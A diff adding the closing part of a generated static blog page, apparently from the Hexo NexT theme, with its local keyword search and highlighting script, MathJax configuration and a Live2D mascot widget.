+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":360},"mobile":{"show":true},"log":false});</script></body>
+</html>
